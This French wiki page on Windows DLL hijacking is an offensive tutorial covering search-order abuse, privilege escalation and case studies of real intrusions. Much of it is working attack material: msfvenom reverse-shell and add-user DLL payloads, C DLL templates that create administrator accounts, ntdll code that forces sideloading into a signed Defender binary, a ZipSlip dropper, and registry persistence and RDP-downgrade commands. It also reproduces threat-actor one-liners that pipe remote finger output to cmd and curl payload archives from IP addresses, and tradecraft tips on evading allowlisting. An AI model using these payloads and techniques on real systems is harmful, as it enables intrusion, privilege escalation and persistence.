# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

DLL Hijacking consiste à manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, and Side-Loading**. Il est principalement utilisé pour l'exécution de code, l'obtention de persistance et, moins fréquemment, l'escalade de privilèges. Bien que l'accent soit mis sur l'escalade ici, la méthode de hijacking reste la même quel que soit l'objectif.

### Techniques courantes

Plusieurs méthodes sont employées pour le DLL hijacking, chacune ayant son efficacité selon la stratégie de chargement de DLL de l'application :

1. **DLL Replacement** : Remplacer une DLL légitime par une DLL malveillante, en utilisant éventuellement DLL Proxying pour préserver la fonctionnalité de la DLL originale.
2. **DLL Search Order Hijacking** : Placer la DLL malveillante dans un chemin de recherche qui est consulté avant celui de la DLL légitime, en exploitant le modèle de recherche de l'application.
3. **Phantom DLL Hijacking** : Créer une DLL malveillante que l'application chargera en pensant qu'il s'agit d'une DLL requise mais inexistante.
4. **DLL Redirection** : Modifier les paramètres de recherche comme %PATH% ou les fichiers .exe.manifest / .exe.local pour diriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : Substituer la DLL légitime par une contrepartie malveillante dans le répertoire WinSxS, méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : Placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques de Binary Proxy Execution.

> [!TIP]
> Pour une chaîne étape par étape qui superpose HTML staging, configurations AES-CTR et implants .NET par-dessus DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trouver les Dll manquantes

La façon la plus courante de trouver des DLL manquantes sur un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **configurant** les **2 filtres suivants** :

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

et n'afficher que l'**activité du système de fichiers** :

![](<../../../images/image (153).png>)

Si vous recherchez des **dll manquantes en général**, laissez cela tourner pendant quelques **secondes**.  
Si vous recherchez une **dll manquante dans un exécutable spécifique**, vous devriez définir **un autre filtre tel que "Process Name" "contains" `<exec name>`, l'exécuter, puis arrêter la capture des événements**.

## Exploiter les Dll manquantes

Pour escalader des privilèges, la meilleure chance est de pouvoir **écrire une dll qu'un processus privilégié tentera de charger** dans un des **emplacements où elle va être cherchée**. Ainsi, nous pourrons **écrire** une dll dans un **dossier** où la **dll est cherchée avant** le dossier où se trouve la **dll originale** (cas étrange), ou nous pourrons **écrire dans un dossier où la dll va être cherchée** et où la dll **originale n'existe** dans aucun dossier.

### Ordre de recherche des Dll

**Dans la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez trouver comment les Dlls sont chargées précisément.**

Les applications Windows recherchent les DLL en suivant un ensemble de **chemins de recherche prédéfinis**, dans un ordre particulier. Le problème de DLL hijacking survient lorsqu'une DLL malveillante est placée stratégiquement dans l'un de ces répertoires, garantissant qu'elle sera chargée avant la DLL authentique. Une solution pour éviter cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle fait référence aux DLL dont elle a besoin.

Vous pouvez voir l'**ordre de recherche des DLL sur les systèmes 32-bit** ci-dessous :

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ceci est l'ordre de recherche **par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (la valeur par défaut est activée).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que LoadLibraryEx charge.

Enfin, notez qu'une dll peut être chargée en indiquant le chemin absolu au lieu du seul nom. Dans ce cas, cette dll ne sera **cherchée que dans ce chemin** (si la dll a des dépendances, elles seront recherchées comme si la dll avait été chargée par son nom).

Il existe d'autres moyens d'altérer l'ordre de recherche mais je ne vais pas les expliquer ici.

### Enchaîner une écriture de fichier arbitraire vers un hijack de DLL manquante

1. Utilisez les filtres ProcMon (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) pour collecter les noms de DLL que le processus teste mais ne trouve pas.
2. Si le binaire s'exécute selon un **schedule/service**, déposer une DLL portant l'un de ces noms dans le **répertoire de l'application** (entrée #1 de l'ordre de recherche) sera chargé à la prochaine exécution. Dans un cas avec un scanner .NET, le processus cherchait hostfxr.dll dans C:\samples\app\ avant de charger la copie réelle depuis C:\Program Files\dotnet\fxr\...
3. Construisez une DLL payload (par ex. reverse shell) avec n'importe quel export : msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll.
4. Si votre primitive est une écriture arbitraire de type ZipSlip, créez un ZIP dont l'entrée sort du répertoire d'extraction afin que la DLL atterrisse dans le dossier de l'application :
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Déposez l'archive dans la boîte de réception/le partage surveillé ; lorsque la tâche planifiée relancera le processus, celui-ci chargera la DLL malveillante et exécutera votre code sous le compte de service.

### Forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une méthode avancée pour influencer de manière déterministe le chemin de recherche des DLL d'un processus nouvellement créé est de définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l'attaquant, un processus cible qui résout une DLL importée par son nom (sans chemin absolu et sans utiliser les drapeaux de chargement sûrs) peut être forcé de charger une DLL malveillante depuis ce répertoire.

Idée clé
- Construisez les paramètres du processus avec RtlCreateProcessParametersEx et fournissez un DllPath personnalisé pointant vers votre dossier contrôlé (par ex. le répertoire où se trouve votre dropper/unpacker).
- Créez le processus avec RtlCreateUserProcess. Lorsque le binaire cible résout une DLL par son nom, le loader consultera ce DllPath fourni pendant la résolution, permettant un sideloading fiable même lorsque la DLL malveillante n'est pas colocée avec l'EXE cible.

Remarques/limitations
- Cela affecte le processus enfant en cours de création ; c'est différent de SetDllDirectory, qui n'affecte que le processus courant.
- La cible doit importer ou appeler LoadLibrary sur une DLL par nom (pas de chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs et les chemins absolus codés en dur ne peuvent pas être détournés. Forwarded exports et SxS peuvent modifier la priorité.

Exemple C minimal (ntdll, wide strings, gestion d'erreurs simplifiée) :

<details>
<summary>Exemple C complet : forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemple d'utilisation opérationnelle
- Placez une xmllite.dll malveillante (exportant les fonctions requises ou servant de proxy vers la DLL réelle) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par nom en utilisant la technique ci‑dessus. Le loader résout l'import via le DllPath fourni et sideloads votre DLL.

Cette technique a été observée en conditions réelles pour conduire des chaînes de sideloading multi-étapes : un lanceur initial dépose une DLL auxiliaire, qui ensuite lance un binaire signé par Microsoft et susceptible d'être détourné avec un DllPath personnalisé pour forcer le chargement de la DLL de l'attaquant depuis un répertoire de staging.


#### Exceptions on dll search order from Windows docs

Certaines exceptions à l'ordre standard de recherche des DLL sont indiquées dans la documentation Windows :

- Lorsqu'une **DLL qui partage son nom avec une autre déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. À la place, il effectue une vérification de redirection et un manifest avant de revenir à la DLL déjà en mémoire. **Dans ce scénario, le système n'effectue pas de recherche pour la DLL**.
- Dans les cas où la DLL est reconnue comme une **known DLL** pour la version de Windows en cours, le système utilisera sa version de la known DLL, ainsi que toutes ses DLL dépendantes, **en renonçant au processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces known DLLs.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leurs **module names**, indépendamment du fait que la DLL initiale ait été identifiée via un chemin complet.

### Escalade de privilèges

**Exigences** :

- Identifier un processus qui fonctionne ou fonctionnera sous des **privilèges différents** (mouvement horizontal ou latéral), et qui **n'a pas une DLL**.
- S'assurer qu'il existe un **accès en écriture** pour tout **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l'exécutable ou un répertoire inclus dans le system path.

Oui, les prérequis sont compliqués à trouver car **par défaut il est plutôt rare de trouver un exécutable privilégié sans dll** et il est encore **plus rare d'avoir des permissions d'écriture sur un dossier du system path** (par défaut vous ne pouvez pas). Mais, dans des environnements mal configurés, cela est possible.\
Si vous avez de la chance et que vous remplissez les conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **but principal du projet est de bypass UAC**, vous y trouverez peut‑être un **PoC** d'un Dll hijaking pour la version de Windows que vous pouvez utiliser (probablement en changeant simplement le chemin du dossier où vous avez des droits en écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers dans PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez aussi vérifier les imports d'un exécutable et les exports d'une dll avec :
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur la manière d'**abuser Dll Hijacking pour escalader des privilèges** avec des permissions d'écriture dans un **System Path folder** consultez :


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture sur n'importe quel dossier du system PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les fonctions **PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll_.

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès est de **créer une dll qui exporte au moins toutes les fonctions que l'exécutable importera d'elle**. Quoi qu'il en soit, notez que Dll Hijacking est utile pour [escalader du niveau Medium Integrity au niveau High **(en contournant UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity vers SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer une dll valide** dans cette étude sur le dll hijacking axée sur le dll hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante** vous pouvez trouver quelques **codes dll basiques** qui pourraient être utiles comme **templates** ou pour créer une **dll avec des fonctions non requises exportées**.

## **Création et compilation de Dlls**

### **Dll Proxifying**

Essentiellement, un **Dll proxy** est une Dll capable d'**exécuter votre code malveillant lors du chargement** mais aussi d'**exposer** et de **fonctionner** comme **attendu** en **redirigeant tous les appels vers la bibliothèque réelle**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) vous pouvez indiquer un exécutable et sélectionner la bibliothèque que vous voulez proxifier et **générer une dll proxifiée** ou indiquer la Dll et **générer une dll proxifiée**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenez un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86 je n'ai pas vu de version x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que dans plusieurs cas la Dll que vous compilez doit **export several functions** qui vont être chargées par le victim process ; si ces functions n'existent pas, le **binary won't be able to load** them et le **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de C++ DLL avec création d'utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternative avec entrée de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas : Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe recherche encore, au démarrage, une DLL de localisation prévisible et spécifique à la langue, qui peut être hijacked pour arbitrary code execution and persistence.

Faits clés
- Chemin sondé (versions actuelles) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Chemin hérité (versions plus anciennes) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL contrôlée par l'attaquant et inscriptible existe au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s'exécute. Aucune exportation n'est requise.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci‑dessus.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Déclenchement et persistance via la configuration Accessibility
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec ce qui précède, démarrer Narrator charge la DLL plantée. Sur le bureau sécurisé (écran de connexion), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator ; votre DLL s'exécute en tant que SYSTEM sur le bureau sécurisé.

Exécution SYSTEM déclenchée par RDP (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Remarques
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Étude de cas: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Détails de la vulnérabilité

- **Composant**: `TPQMAssistant.exe` situé dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tâche planifiée**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s'exécute quotidiennement à 09:30 sous le contexte de l'utilisateur connecté.
- **Permissions du répertoire**: inscriptible par `CREATOR OWNER`, permettant aux utilisateurs locaux de déposer des fichiers arbitraires.
- **Comportement de recherche des DLL**: tente de charger `hostfxr.dll` depuis son répertoire de travail en premier et logue "NAME NOT FOUND" si absent, indiquant une priorité de recherche dans le répertoire local.

### Implémentation de l'exploit

Un attaquant peut placer un stub malveillant `hostfxr.dll` dans le même répertoire, exploitant la DLL manquante pour obtenir l'exécution de code dans le contexte de l'utilisateur :
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flux d'attaque

1. En tant qu'utilisateur standard, déposer `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendre que la tâche planifiée s'exécute à 9:30 sous le contexte de l'utilisateur courant.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur avec une intégrité moyenne.
4. Enchaîner des techniques standard de contournement de l'UAC pour élever l'intégrité moyenne aux privilèges SYSTEM.

## Étude de cas: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Les acteurs malveillants associent souvent MSI-based droppers avec DLL side-loading pour exécuter des payloads sous un processus signé et de confiance.

Aperçu de la chaîne
- L'utilisateur télécharge le MSI. Une CustomAction s'exécute silencieusement pendant l'installation GUI (par ex., LaunchApplication ou une action VBScript), reconstituant l'étape suivante à partir de ressources intégrées.
- Le dropper écrit un EXE légitime signé et une DLL malveillante dans le même répertoire (exemple : Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Lorsque l'EXE signé est lancé, Windows DLL search order charge wsc.dll depuis le répertoire de travail en premier, exécutant le code de l'attaquant sous un parent signé (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Recherchez des entrées qui lancent des exécutables ou du VBScript. Exemple de motif suspect : LaunchApplication exécutant un fichier intégré en arrière-plan.
- Dans Orca (Microsoft Orca.exe), inspectez les tables CustomAction, InstallExecuteSequence et Binary.
- Embedded/split payloads in the MSI CAB:
- Extraction administrative: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou utiliser lessmsi: lessmsi x package.msi C:\out
- Recherchez plusieurs petits fragments qui sont concaténés et décryptés par une VBScript CustomAction. Flux commun :
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratique avec wsc_proxy.exe
- Placez ces deux fichiers dans le même dossier :
- wsc_proxy.exe: hôte signé légitime (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
- wsc.dll: DLL d'attaquant. Si aucun export spécifique n'est requis, DllMain peut suffire ; sinon, construisez une proxy DLL et redirigez les exports requis vers la bibliothèque légitime tout en exécutant le payload dans DllMain.
- Créez un payload DLL minimal :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les exigences d'exportation, utilisez un framework de proxy (e.g., DLLirant/Spartacus) pour générer un forwarding DLL qui exécute aussi votre payload.

- Cette technique repose sur la résolution du nom DLL par le binaire hôte. Si l'hôte utilise des chemins absolus ou des drapeaux de chargement sûrs (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS, et les forwarded exports peuvent influencer la priorité et doivent être pris en compte lors du choix du binaire hôte et de l'ensemble des exports.

## Triades signées + payloads chiffrés (étude de cas ShadowPad)

Check Point a décrit comment Ink Dragon déploie ShadowPad en utilisant une **triade de trois fichiers** pour se fondre dans des logiciels légitimes tout en gardant le payload principal chiffré sur le disque :

1. **Signed host EXE** – des fournisseurs comme AMD, Realtek, ou NVIDIA sont abusés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attaquants renomment l'exécutable pour qu'il ressemble à un binaire Windows (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **Malicious loader DLL** – déposé à côté de l'EXE avec un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un binaire MFC obfusqué avec le framework ScatterBrain ; sa seule tâche est de localiser le blob chiffré, le déchiffrer, et mapper ShadowPad de manière réflexive.
3. **Encrypted payload blob** – souvent stocké sous forme de `<name>.tmp` dans le même répertoire. Après avoir mappé en mémoire le payload déchiffré, le loader supprime le fichier TMP pour détruire les preuves forensiques.

Remarques tradecraft :

* Renommer le EXE signé (tout en gardant le `OriginalFileName` d'origine dans l'en-tête PE) lui permet de se faire passer pour un binaire Windows tout en conservant la signature du fournisseur ; reproduisez donc la pratique d'Ink Dragon qui dépose des binaires ressemblant à `conhost.exe` alors qu'il s'agit d'utilitaires AMD/NVIDIA.
* Comme l'exécutable reste trusted, la plupart des contrôles d'allowlisting nécessitent uniquement que votre DLL malveillante soit placée à côté. Concentrez-vous sur la personnalisation du loader DLL ; le parent signé peut généralement s'exécuter sans modification.
* Le déchiffreur de ShadowPad attend que le blob TMP soit placé à côté du loader et soit writable afin de pouvoir zéroter le fichier après le mapping. Gardez le répertoire writable jusqu'au chargement du payload ; une fois en mémoire, le fichier TMP peut être supprimé en toute sécurité pour l'OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Les opérateurs associent DLL sideloading avec LOLBAS de sorte que le seul artefact personnalisé sur le disque soit la DLL malveillante à côté de l'EXE trusted :

- **Remote command loader (Finger):** Un PowerShell caché lance `cmd.exe /c`, récupère des commandes depuis un serveur Finger et les pipe vers `cmd` :

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` récupère du texte via TCP/79 ; `| cmd` exécute la réponse du serveur, permettant aux opérateurs de faire tourner le serveur de second stage côté serveur.

- **Built-in download/extract:** Télécharger une archive avec une extension bénigne, la décompresser, et placer le target de sideload ainsi que la DLL dans un dossier `%LocalAppData%` aléatoire :

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise le tar intégré de Windows.

- **WMI/CIM launch:** Démarrer l'EXE via WMI afin que la télémétrie indique un processus créé par CIM pendant qu'il charge la DLL colocée :

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Fonctionne avec des binaires qui privilégient les DLL locales (e.g., `intelbq.exe`, `nearby_share.exe`) ; le payload (e.g., Remcos) s'exécute sous le nom trusted.

- **Hunting:** Alerter sur `forfiles` quand `/p`, `/m`, et `/c` apparaissent ensemble ; peu courant en dehors des scripts d'administration.


## Étude de cas : NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Une intrusion récente de Lotus Blossom a abusé d'une chaîne de mise à jour trusted pour livrer un dropper empaqueté NSIS qui a préparé un DLL sideload plus des payloads entièrement en mémoire.

Flux tradecraft
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque **HIDDEN**, dépose un Bitdefender Submission Wizard renommé `BluetoothService.exe`, une `log.dll` malveillante, et un blob chiffré `BluetoothService`, puis lance l'EXE.
- L'EXE hôte importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob via mmap ; `LogWrite` le déchiffre avec un flux personnalisé basé sur LCG (constantes **0x19660D** / **0x3C6EF35F**, matériau de clé dérivé d'un hash préalable), écrase le buffer avec du shellcode en clair, libère les temporaires et saute vers celui-ci.
